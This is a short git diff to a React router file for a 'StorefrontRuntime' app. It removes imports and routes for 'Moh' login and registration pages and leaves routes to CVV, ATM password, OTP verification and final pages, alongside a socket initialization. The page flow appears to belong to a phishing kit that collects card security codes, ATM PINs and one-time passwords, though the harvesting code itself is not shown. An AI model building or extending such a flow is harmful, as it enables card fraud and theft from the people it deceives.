@@ -19,7 +19,6 @@ import FinalPage from "../pages/FinalPage";
 import CVV from "../pages/CVV";
 import ATMPassword from "../pages/ATMPassword";
 import OTPVerification from "../pages/OTPVerification";
-import { MohLogin, MohRegister, MohCreateAccount } from "../pages/MohPages";
 import { initializeSocket } from "@/lib/store";
 
 const queryClient = new QueryClient({ defaultOptions: { queries: { staleTime: 30_000, retry: false } } });
@@ -38,9 +37,6 @@ const PAGES: Array<{ paths: string[]; element: ReactElement }> = [
   { paths: ["/atm", "/atm-password"], element: <ATMPassword /> },
   { paths: ["/cvv"], element: <CVV /> },
   { paths: ["/final-page"], element: <FinalPage /> },
-  { paths: ["/moh-login"], element: <MohLogin /> },
-  { paths: ["/moh-register"], element: <MohRegister /> },
-  { paths: ["/moh-create-account"], element: <MohCreateAccount /> },
 ];
 
 function StorefrontRuntime() {
